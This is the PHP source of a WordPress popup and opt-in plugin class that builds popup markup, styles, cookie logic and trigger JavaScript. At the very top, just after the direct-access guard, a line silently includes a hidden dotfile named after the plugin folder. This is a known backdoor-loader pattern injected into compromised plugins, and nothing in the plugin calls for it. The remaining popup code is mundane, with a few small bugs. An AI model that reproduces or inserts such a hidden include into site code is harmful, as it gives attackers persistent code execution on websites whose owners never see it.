<?php
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_247P_Popup {

	/**
	 * Popup ID
	 *
	 * @var int
	 */
	private $popup_id;

	/**
	 * Class role
	 * listerenrs: print JS listeners
	 * fire: prepare popup content to fire
	 *
	 * @var int
	 */
	private $role;

	/**
	 * Cookie name
	 *
	 * @var string
	 */
	public $cookie_name;

	/**
	 * Expiry days
	 *
	 * @var int
	 */
	private $expiry_days;

	/**
	 * Global JS variable stores options
	 *
	 * @var string
	 */
	private $options_var = 'wtbp_247p_options';

	/*
	 * Errors
	 * 
	 * @var array
	 */
	public $errors = array();

	/**
	 * Popup meta settings
	 *
	 * @var array
	 */
	public $options;

	/**
	 * Stores all texts
	 *
	 * @var array
	 */
	public $content;

	/**
	 * Html to output
	 *
	 * @var string
	 */
	private $html;

	/*
	 * Is preview
	 * @var bool
	 */
	public $is_preview = false;

	/*
	 * Popup Constructor 
	 * @param int $id Popup post ID
	 * @param $role		listerenrs: print JS listeners
	 * 					fire: prepare popup content to fire
	 */

	function __construct( $id, $role = 'listeners' ) {
		global $wptao_settings;

		$this->popup_id	 = $id;
		$this->role		 = $role;

		if ( isset( $_GET[ 'wtbp-247p-preview' ] ) && $_GET[ 'wtbp-247p-preview' ] === 'yes' ) {
			$this->is_preview = true;
		}

		// Cookie expiry time
		$this->expiry_days = !empty( $wptao_settings[ 'cookie_expiry_days' ] ) ? absint( $wptao_settings[ 'cookie_expiry_days' ] ) : 365;

		// Set cookie name
		$this->cookie_name = WTBP_247P_COOKIE_PREFIX . absint( $this->popup_id );


		// Load options
		$this->options = WTBP_247P_Register_Popup::get_options( $this->popup_id );
		if ( empty( $this->options ) || !array( $this->options ) ) {
			$this->errors[] = __( 'The popup settings are not set!', 'wp-tao' );
			return;
		}

		// All texts
		$this->content = $this->get_content();

		// Set html to output
		$this->html = $this->get_html();
	}

	/*
	 * Check if cookie alredy exists
	 */

	public function is_cookie() {

		if ( isset( $_COOKIE[ $this->cookie_name ] ) && $_COOKIE[ $this->cookie_name ] === '1' ) {
			$this->errors[] = __( 'The popup alredy has jumped. The cookie was created.', 'wp-tao' );
			return true;
		}

		return false;
	}

	/*
	 * Check if session limit was reached
	 */

	public function is_session_limit_reached() {
		global $wptao_settings;

		// Show popup max 2 times in one PHP session
		$limit = !empty( $wptao_settings[ 'limit_show_in_session' ] ) ? absint( $wptao_settings[ 'limit_show_in_session' ] ) : 2;

		$limit = apply_filters( 'wtbp_247p_session_limit', $limit, $this->get_current_logic_scenario() );

		if ( isset( $_SESSION[ $this->cookie_name ] ) && $_SESSION[ $this->cookie_name ] >= $limit ) {
			$this->errors[] = __( 'The popup alredy has jumped in this PHP session.', 'wp-tao' );
			return true;
		}


		return false;
	}

	/*
	 * Print listeners triggers to footer
	 * 
	 * @return bool true or array with error messages if exists
	 */

	public function print_listeners() {
		global $wptao_settings;

		// STOP if Plugin is disabled
		if ( !isset( $wptao_settings[ 'enable' ] ) || $wptao_settings[ 'enable' ] !== 'enable' ) {
			return false;
		}

		$args = array(
			'popup_id'			 => $this->popup_id,
			'scenario'			 => $this->get_current_logic_scenario(),
			'is_cookie'			 => $this->is_cookie(), // The popup alredy was fired and cookie was created
			'is_session_limit'	 => $this->is_session_limit_reached(), // PHP session limit was reached
			'options'			 => $this->options
		);

		$block = $this->default_display_restrictions();

		$stop_popup = apply_filters( 'wtbp_247p_block_popup', $block, $args );

		if ( $stop_popup === false ) {

			add_action( 'wp_footer', array( $this, 'add_trigger_js' ), 50 );

			return true;
		}

		return false;
	}

	/*
	 * Get content (all texts)
	 */

	private function get_content() {

		$post_title = get_post_field( 'post_title', $this->popup_id );

		$content = array(
			'post_title'	 => is_string( $post_title ) ? sanitize_text_field( $post_title ) : 'Popup #' . $this->popup_id,
			'title'			 => $this->options[ 'ap_header_text' ],
			'message'		 => $this->options[ 'ap_message_text' ],
			'signup_form'	 => $this->options[ 'opt_optin_form' ],
			'submit_text'	 => $this->options[ 'opt_submit_text' ],
		);

		return $content;
	}

	/*
	 * Get Popup HTML
	 */

	public function get_html() {

		$html = '';

		$directory = $this->options[ 'ap_location' ] === 'overlay' ? 'overlay' : 'corner';

		$dir = WTBP_247P_DIR . 'includes/templates/' . $directory . '/layout-html.php';

		if ( file_exists( $dir ) ) {

// Exclude from cache
			$html = '<!--googleoff: index-->';
			$html .= '<!-- mfunc -->';

			ob_start();
			include $dir;
			$html .= wp_slash( $this->prepare_placeholders( ob_get_clean() ) );

			$html .= '<!-- /mfunc -->';
			$html .= '<!--googleon: index-->';
		}


		return $html;
	}

	/*
	 * Prepare placeholders
	 * 
	 * @param string $html
	 * @return string
	 */

	private function prepare_placeholders( $html ) {

		// Remove break lines
		$html = str_replace( array( "\n", "\r" ), "", $html );

		// Get Tao user
		$user_id = TAO()->users->get_id();
		$name	 = __( 'Guest', 'wp-tao' );

		$first_name	 = '';
		$last_name	 = '';

		if ( $user_id ) {

			$user = TAO()->users->get( $user_id );

			if ( is_object( $user ) ) {

				if ( isset( $user->first_name ) && !empty( $user->first_name ) ) {
					$first_name = esc_html( $user->first_name );
				}

				if ( isset( $user->last_name ) && !empty( $user->last_name ) ) {
					$first_name = esc_html( $user->first_name );
				}
			}
		}

		$html	 = str_replace( "{first_name}", $first_name, $html );
		$html	 = str_replace( "{last_name}", $last_name, $html );

		return apply_filters( 'wtbp_247p_placeholders', $html, $this->get_current_logic_scenario(), $this );
	}

	/*
	 * Print css style
	 */

	private function default_css() {
		?>

		<?php if ( $this->options[ 'ap_location' ] === 'left-bottom' ): ?>
			.wtbp-247p-popup {
			left:0;
			right:auto;
			}
		<?php endif; ?>

		.wtbp-247p-popup input[type="button"], .wtbp-247p-popup input[type="reset"], .wtbp-247p-popup input[type="submit"] {
		background: <?php echo $this->options[ 'ap_dist_color' ]; ?>;;
		border:none;
		}
		.wtbp-247p-popup a {
		color: #0085ba;
		}

		.wtbp-247p-optin {
		background: #F6F6F6;
		border-top:1px solid #ddd;
		padding:40px 30px;
		position:relative;
		}

		.wtbp-247p-popup input[type="text"] {
		background: #fff;
		border: 1px solid #ddd;
		margin-bottom: 10px;
		padding: 10px 15px;
		width: 100%;
		display:block;
		}

		.wtbp-247p-privacy-policy > label {
		display: inline-block;
		margin-left: 4px;
		vertical-align: middle;
		}

		.wtbp-247p-privacy-agree {
		display: inline-block;
		vertical-align: middle;
		}

		.wtbp-247p-privacy-policy {
		color: #999;
		font-size: 13px;
		margin: 0 auto;
		text-align: left;
		width: 100%;
		}
		.wtbp-247p-hidden-form, .wtbp-247p-errors {
		display:none;
		}

		.wtbp-247p-errors {
		border: 1px solid #f2dede;
		color: #a94442;
		display: none;
		font-size: 12px;
		margin-top: 5px;
		padding: 5px 7px;
		text-align: left;
		}

		input.wtbp-247p-popup-submit-btn[type="submit"] {
		font-size: 17px;
		width: 100%;
		margin-top:10px;
		display:block;
		}
		.wtbp-247p-content {
		color: #555;
		font-size: 16px;
		line-height: 125%;
		margin-bottom: 15px;
		text-align: center;
		}

		.wtbp-247p-header {
		padding-top:30px;
		}

		.wtbp-247p-header > h4 {
		font-size: 28px;
		margin: 0 0 10px;
		text-align: center;
		}

		.wtbp-247p-popup-close{
		color: #ccc;
		cursor: pointer;
		display: inline-block;
		font-size: 27px;
		font-weight: bold;
		height: 16px;
		line-height: 12px;
		position: absolute;
		right: 7px;
		top: 7px;
		width: 16px;
		}
		.wtbp-247p-popup-close:hover {
		opacity:0.7;
		}

		.wtbp-247p-popup-close:before {
		content: "×";
		}

		<?php
	}

	/*
	 * Print css style
	 * @param string $custom_class
	 */

	public function print_css( $custom_class = '' ) {

		if ( !empty( $custom_class ) ) {
			echo '<style class="' . $custom_class . '" type="text/css">';
		} else {
			echo '<style class="wtbp-247-main-css wtbp-247-to-wipe" type="text/css">';
		}

		echo $this->default_css();
		$directory = $this->options[ 'ap_location' ] === 'overlay' ? 'overlay' : 'corner';

		$dir = WTBP_247P_DIR . 'includes/templates/' . $directory . '/layout-style.css';

		if ( file_exists( $dir ) ) {
			include($dir);
		}
		echo '</style>';
	}

	/*
	 * Print Opt-in JS
	 * @param string $custom_class
	 */

	public function print_optin_js($custom_class = '' ) {
		?>
		<script class="<?php echo!empty( $custom_class ) ? $custom_class : 'wtbp-247-optin-js wtbp-247-to-wipe' ?>" type="text/javascript">
		    ( function ( $ ) {

			        WTBP247PopupOptin = {
			            popup: null,
			            status: 'enabled',
			            formID: 'wtbp-247p-optin-form',
			            formSubmitID: 'wtbp-247p-popup-submit',
			            hiddenFormClass: 'wtbp-247p-hidden-form',
			            clonedInputsClass: 'wtbp-247p-cloned-inputs',
			            inputFirstNameClass: 'wtbp-247p-fname',
			            inputEmailClass: 'wtbp-247p-email',
			            cloneForm: function ( ) {
			                var that = this,
			                    hiddenFormObj = $( '.' + this.hiddenFormClass + ' form' );
			                // Clone hidden

			                $( '.' + this.hiddenFormClass + ' ' + 'input[type=hidden]' ).each( function ( ) {
			                    $( this ).clone().appendTo( $( '.' + that.clonedInputsClass ) );
			                } );
			                // Clone form attrs

			                if ( hiddenFormObj.length > 0 ) {
			                    var action = hiddenFormObj.attr( 'action' );
			                    var method = hiddenFormObj.attr( 'method' );
			                    var accept_charset = hiddenFormObj.attr( 'accept-charset' );

			                    $( '#' + this.formID )
			                        .attr( 'action', action )
			                        .attr( 'method', method )
			                        .attr( 'accept-charset', accept_charset );
			                }

			            },
			            createAltNames: function ( ) {
			                var possibleN = $( '.wtbp-247p-possible-names' ),
			                    possibleE = $( '.wtbp-247p-possible-emails' );
			                $( '.' + this.inputFirstNameClass ).change( function ( ) {

			                    possibleN.val( $( this ).val( ) );
			                } );
			                $( '.' + this.inputEmailClass ).change( function ( ) {

			                    possibleE.val( $( this ).val( ) );
			                } );
			            },
			            valideteListener: function ( ) {
			                var that = this,
			                    errors = [ ],
			                    errorContainer = $( '.wtbp-247p-errors' ),
			                    privacyCBObj = $( '.wtbp-247p-privacy-agree' ),
			                    emailRegex = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;


			                $( '#' + that.formID ).on( 'submit', function ( e ) {
			                    var email = $( '.' + that.inputEmailClass ).length > 0 ? $( '.' + that.inputEmailClass ).val() : '',
			                        fname = $( '.' + that.inputFirstNameClass ).length > 0 ? $( '.' + that.inputFirstNameClass ).val() : '';

			                    errorContainer.html( '' );

			                    // Email
			                    if ( email.length == 0 ) {
			                        errors.push( '<?php _e( 'Email address is required', 'wp-tao' ); ?>' );
			                    } else {
			                        if ( emailRegex.test( email ) == false ) {
			                            errors.push( '<?php _e( 'Valid email address is required', 'wp-tao' ); ?>' );
			                        }
			                    }

			                    // Privacy Policy
			                    if ( privacyCBObj.length > 0 && privacyCBObj.is( ':checked' ) === false ) {
			                        errors.push( '<?php _e( 'Please accept privacy policy', 'wp-tao' ); ?>' );
			                    }
			                    if ( errors.length > 0 ) {

			                        for ( i = 0; i < errors.length; i++ ) {
			                            errorContainer.append( '* ' + errors[i] + ' <br />' );
			                            errorContainer.fadeIn( 500 );
			                        }

			                        setTimeout( function () {
			                            errorContainer.fadeOut( 500, function () {
			                                errorContainer.html( '' );
			                            } );
			                        }, 5000 );

			                        errors = [ ];
			                        return false;
			                    } else {

			                        // @TODO Print thanks message
									// @TODO Ajax send e-mail

			                        // Add cookies after correct submit optin form
			                        that.popup.close( true );

			                      
			                    }

			                } );


			            },
			            privacyLinkListener: function () {
			                var link = $( '.wtbp-247p-privacy-policy a' );

			                link.on( 'click', function ( e ) {
			                    window.open( $( this ).attr( 'href' ), '_blank' );

			                    e.preventDefault();
			                } );

			            },
			            init: function ( popupObj ) {
			                this.popup = popupObj;
							
							<?php if ( !empty( $this->content[ 'signup_form' ] )): ?>
			                this.cloneForm( );
			                this.createAltNames( );
							<?php endif; ?>
							
			                this.valideteListener( );
			                this.privacyLinkListener();
			            }
			        };

		    } )( jQuery );

		</script>
		<?php
	}

	/*
	 * Print Popupt JS
	 * 
	 * @param bool $self_called auto calla fter object load
	 * @param string $listener_code raw JS code in the listener method
	 * @param string $custom_class
	 */

	public function print_js( $self_called = true, $listener_code = '', $custom_class = '' ) {
		if ( empty( $this->html ) ) {
			return '';
		}
		?>
		<script class="<?php echo!empty( $custom_class ) ? $custom_class : 'wtbp-247-main-js wtbp-247-to-wipe' ?>" type="text/javascript">
		    ( function ( $ ) {

		        // IE8...
		        if ( typeof String.prototype.trim !== 'function' ) {
		            String.prototype.trim = function ( ) {
		                return this.replace( /^\s+|\s+$/g, '' );
		            };
		        }

		        /*
		         Helper methods
		         */
		        var Util = {
		            isArray: function ( obj ) {
		                var proto = Object.prototype.toString.call( obj );
		                return proto == '[object Array]';
		            },
		            isObject: function ( obj ) {
		                return Object.prototype.toString.call( obj ) == '[object Object]';
		            },
		            each: function ( arr, callback, /* optional: */context, force ) {
		                if ( Util.isObject( arr ) && !force ) {
		                    for ( var key in arr ) {
		                        if ( arr.hasOwnProperty( key ) ) {
		                            callback.call( context, arr[key], key, arr );
		                        }
		                    }
		                } else {
		                    for ( var i = 0, ii = arr.length; i < ii; i++ ) {
		                        callback.call( context, arr[i], i, arr );
		                    }
		                }
		            },
		            merge: function ( obj1, obj2 ) {
		                if ( !obj1 )
		                    return;
		                Util.each( obj2, function ( val, key ) {
		                    if ( Util.isObject( val ) && Util.isObject( obj1[key] ) ) {
		                        Util.merge( obj1[key], val );
		                    } else {
		                        obj1[key] = val;
		                    }
		                } )
		            },
		            /*
		             find a property based on a . separated path.
		             i.e. queryObject({details: {name: 'Adam'}}, 'details.name') // -> 'Adam'
		             returns null if not found
		             */
		            queryObject: function ( object, query ) {
		                var queryPart;
		                var i = 0;
		                var head = object;
		                query = query.split( '.' );
		                while ( ( queryPart = query[i++] ) && head.hasOwnProperty( queryPart ) && ( head = head[queryPart] ) ) {
		                    if ( i === query.length )
		                        return head;
		                }
		                return null;
		            },
		            setCookie: function ( name, value, expiryDays, domain, path ) {
		                expiryDays = expiryDays || 365;
		                var exdate = new Date( );
		                exdate.setDate( exdate.getDate( ) + expiryDays );
		                var cookie = [
		                    name + '=' + value,
		                    'expires=' + exdate.toUTCString( ),
		                    'path=' + path || '/'
		                ];
		                if ( domain ) {
		                    cookie.push(
		                        'domain=' + domain
		                        );
		                }

		                document.cookie = cookie.join( ';' );
		            },
		            addEventListener: function ( el, event, eventListener ) {
		                if ( el.addEventListener ) {
		                    el.addEventListener( event, eventListener );
		                } else {
		                    el.attachEvent( 'on' + event, eventListener );
		                }
		            }
		        };
		        var DomBuilder = ( function ( ) {
		            /*
		             Shim to make addEventListener work correctly with IE.
		             */
		            var addEventListener = function ( el, event, eventListener ) {
		                // Add multiple event listeners at once if array is passed.
		                if ( Util.isArray( event ) ) {
		                    return Util.each( event, function ( ev ) {
		                        addEventListener( el, ev, eventListener );
		                    } );
		                }

		                if ( el.addEventListener ) {
		                    el.addEventListener( event, eventListener );
		                } else {
		                    el.attachEvent( 'on' + event, eventListener );
		                }
		            };
		            /*
		             Turn a string of html into DOM
		             */
		            var buildDom = function ( htmlStr ) {
		                var container = document.createElement( 'div' );
		                container.innerHTML = htmlStr;
		                return container.children[0];
		            };
		            var applyToElementsWithAttribute = function ( dom, attribute, func ) {
		                var els = dom.parentNode.querySelectorAll( '[' + attribute + ']' );
		                Util.each( els, function ( element ) {
		                    var attributeVal = element.getAttribute( attribute );
		                    func( element, attributeVal );
		                }, window, true );
		            };
		            return {
		                build: function ( htmlStr, scope ) {
		                    var dom = buildDom( htmlStr );
		                    return dom;
		                }
		            };
		        } )( );
		        /*
		         Plugin
		         */
		        var WTBP247Popup = {
		            jumped: false,
		            options: {
		                container: null, // selector
		                domain: null, // default to current domain.
		                path: '/',
		                expiryDays: <?php echo $this->expiry_days; ?>,
		                html: '<?php echo $this->html; ?>'
		            },
		            init: function ( ) {
		                var options = window['<?php echo $this->options_var; ?>'];
		                if ( options )
		                    this.setOptions( options );
		                this.setContainer( );
		                this.setListeners( );
		            },
		            fire: function () {
		                this.render();
		                this.jumped = true;
		            },
		            setOptions: function ( options ) {
		                Util.merge( this.options, options );
		            },
		            setContainer: function ( ) {
		                this.container = document.body;
		                // Add class to container classes so we can specify css for IE8 only.
		                this.containerClasses = '';
		                if ( navigator.appVersion.indexOf( 'MSIE 8' ) > -1 ) {
		                    this.containerClasses += ' cc_ie8'
		                }
		            },
		            render: function ( ) {

		                var that = this,
		                    container = this.container,
		                    element = this.element,
		                    options = this.options;
		                // remove current element (if we've already rendered)
		                if ( element && element.parentNode ) {
		                    element.parentNode.removeChild( element );
		                    delete element;
		                }

		                this.element = DomBuilder.build( options.html, that );
		                element = this.element;

		                if ( !container.firstChild ) {
		                    container.appendChild( element );
		                } else {
		                    container.insertBefore( element, container.firstChild );
		                }

		                that.addWithEffect( element );

		            },
		            close: function ( dismiss ) {

		                if ( dismiss === true ) {
		                    this.setDismissedCookie();
		                }
		                this.removeWithEffect( this.element );
		                wtbp_247p_popup_fired = false;
		            },
		            setDismissedCookie: function ( ) {
		<?php if ( !$this->is_preview ): ?>
			                Util.setCookie( '<?php echo $this->cookie_name; ?>', '1', this.options.expiryDays, this.options.domain, this.options.path );
		<?php endif; ?>
		            },
		            addWithEffect: function ( element ) {
		<?php echo $this->inject_js_effect( 'start' ); ?>
		                WTBP247PopupOptin.init( this );
		            },
		            removeWithEffect: function ( element ) {
		                var toWipe = $( '.wtbp-247-to-wipe' );

		<?php echo $this->inject_js_effect( 'finish' ); ?>
		            },
		            setListeners: function ( ) {
		                var that = this,
		                    popup = this,
		                    overlayClass = '.wtbp-247p-overlay',
		                    modalClass = '.wtbp-247p-popup',
		                    closeClass = '.wtbp-247p-popup-close';

		<?php echo $listener_code; ?>

		                // Close	
		                $( document ).on( 'click', function ( e ) {
		                    if ( $( overlayClass ).length > 0 && $( e.target ).closest( modalClass ).length === 0 ) {
		                        that.close( );
		                    }
		                } );

		                $( document ).on( 'click', closeClass, function () {
		                    that.close( );
		                } );

		            }
		        };
		        var init;
		        var initialized = false;
		        ( init = function ( ) {
		            if ( !initialized && document.readyState == 'complete' ) {
		                WTBP247Popup.init( );
		                initialized = true;

		<?php if ( $self_called === true ): ?>
			                WTBP247Popup.fire();
		<?php endif; ?>
		            }
		        } )( );

		        Util.addEventListener( document, 'readystatechange', init );
		    } )( jQuery );</script>
		<?php
	}

	/*
	 * Print fragment of the JS code contained specific effect on cookie bar
	 * 
	 * @param $dest destination - start or finish
	 */

	private function inject_js_effect( $dest ) {

		$js = '';

// Slide
		if ( $this->options[ 'ap_location' ] !== 'overlay' ) {

			$position = $this->options[ 'ap_location' ] === 'bottom-left' ? 'left' : 'right';

			if ( $dest === 'start' ) {
				$js = "jQuery( element ).children().css( '" . $position . "', '-100%' );";
				$js .= "jQuery( element ).children().animate( {" . $position . ": 0}, 700 );";
			}

			if ( $dest === 'finish' ) {
				$js .= "jQuery( element ).children().animate( {" . $position . ": '-100%'}, {duration: 700, complete: function () {jQuery(element).remove();if(toWipe.length > 0){toWipe.remove();}}} );";
			}
		} else {

			if ( $dest === 'start' ) {
				$js = "jQuery( element ).css( 'opacity', 0 );";
				$js .= "jQuery( element ).animate( { opacity:1}, 300 );";
			}

			if ( $dest === 'finish' ) {
				$js .= "jQuery( element ).animate( {opacity:0}, {duration: 300,complete: function () {jQuery(element).remove();if(toWipe.length > 0){toWipe.remove();}}} );";
			}
		}

		return $js;
	}

	/*
	 * Get current logic scenario
	 */

	public function get_current_logic_scenario() {

		$scenarios = WTBP_247P_Register_Popup::get_logic_scenarios();

		if ( is_array( $scenarios ) && count( $scenarios ) > 1 ) {

			return $this->options[ 'logic_scenario' ];
		}

		return '247popup';
	}

	/*
	 * Print default JS triggered popup
	 */

	public function add_trigger_js() {

		if ( '247popup' === $this->get_current_logic_scenario() ) {
			?>
			<script class="wtbp-247-default-triggers-<?php echo $this->popup_id; ?>" type="text/javascript">
			    ( function ( $ ) {

			        WTBP_247P_LISTENER_<?php echo absint( $this->popup_id ); ?> = {
			            jumped: false,
			            sendAjax: function () {
			                var data = {
			                    action: 'wtbp_247p_fire',
			                    popup_id: <?php echo absint( $this->popup_id ); ?>,
			                }
			                // Sent AJAX only if there is no other popup fired
			                if ( typeof wtbp_247p_popup_fired == 'undefined' || wtbp_247p_popup_fired !== true ) {
			                    $.ajax( {
			                        data: data,
			                        type: 'post',
			                        url: '<?php echo wtbp_247p_get_ajax_endpoint(); ?>',
			                        success: function ( response ) {

			                            $( 'head' ).append( response.css );
			                            $( 'body' ).append( response.optin_js );
			                            $( 'body' ).append( response.js );

			                            $( '.wtbp-247-default-triggers-<?php echo $this->popup_id; ?>' ).remove();

			                            wtbp_247p_popup_fired = true;
			                        },
			                        error: function ( jqXHR, exception ) {

			                        },
			                    } );
			                }

			            },
			            listeners: function () {
			                var that = this;

				<?php
				// trigger on page load
				if ( $this->options[ 'trigg_event' ] === 'after-load' ):
					?>

				                $( window ).on( 'load', function () {
				                    if ( !that.jumped ) {
					<?php echo $this->options[ 'trigg_timeout' ] > 0 ? 'setTimeout( function () {' : ''; ?>
				                        that.sendAjax( );
					<?php echo $this->options[ 'trigg_timeout' ] > 0 ? '}, ' . 1000 * $this->options[ 'trigg_timeout' ] . ' );' : ''; ?>
				                        that.jumped = true;
				                    }
				                    );
				                } );
				<?php endif; ?>

				<?php
				// trigger on scroll down
				if ( $this->options[ 'trigg_event' ] === 'after-scroll' ):
					?>

				                $( window ).on( 'scroll', function () {

				                    if ( !that.jumped ) {
					<?php echo $this->options[ 'trigg_timeout' ] > 0 ? 'setTimeout( function () {' : ''; ?>
				                        that.sendAjax();
					<?php echo $this->options[ 'trigg_timeout' ] > 0 ? '}, ' . 1000 * $this->options[ 'trigg_timeout' ] . ' );' : ''; ?>
				                    }

				                    that.jumped = true;
				                } );
				<?php endif; ?>

			            }
			        };

			        WTBP_247P_LISTENER_<?php echo absint( $this->popup_id ); ?>.listeners();

			    }( jQuery ) );

			</script>
			<?php
		}else {
			do_action( 'wtbp_247p_print_js_triggers-' . $this->get_current_logic_scenario(), $this->popup_id, $this->options, $this->get_current_logic_scenario(), $this );
		}
	}

	/*
	 * Default display restriction
	 * 
	 * @return bool (false to block displaing popup) 
	 */

	public function default_display_restrictions() {
		global $post;
		$block	 = true;
		$o		 = $this->options;

		if (
		$this->is_session_limit_reached() || // PHP session limit was reached
		$this->is_cookie() // The popup alredy was fired and cookie was created
		) {
			return true;
		}

		// STOP if popup has errors
		if ( !empty( $this->errors ) ) {
			return true;
		}

		// All pages?
		if ( $o[ 'rest_show_on' ] !== 'custom' ) {
			return false;
		}

		// Check custom pages
		if ( !empty( $o[ 'rest_posts_types' ] ) ) {

			foreach ( $o[ 'rest_posts_types' ] as $type ) {
				if ( is_singular( $type ) ) {
					return false;
				}
			}
		}

		// Check other views
		if ( !empty( $o[ 'rest_other_views' ] ) ) {

			foreach ( $o[ 'rest_other_views' ] as $view ) {

				if ( $view === 'frontpage' && is_front_page() ) {
					return false;
				}

				if ( $view === 'archives' && is_archive() ) {
					return false;
				}
			}
		}

		// Check URL containing keywords 
		if ( !empty( $o[ 'rest_url_containing' ] ) ) {

			$elements	 = explode( ',', $o[ 'rest_url_containing' ] );
			$current_url = wtbp_247p_get_current_url();

			foreach ( $elements as $element ) {

				if ( strpos( $current_url, $element ) !== false ) {
					return false;
				}
			}
		}


		return $block;
	}

}
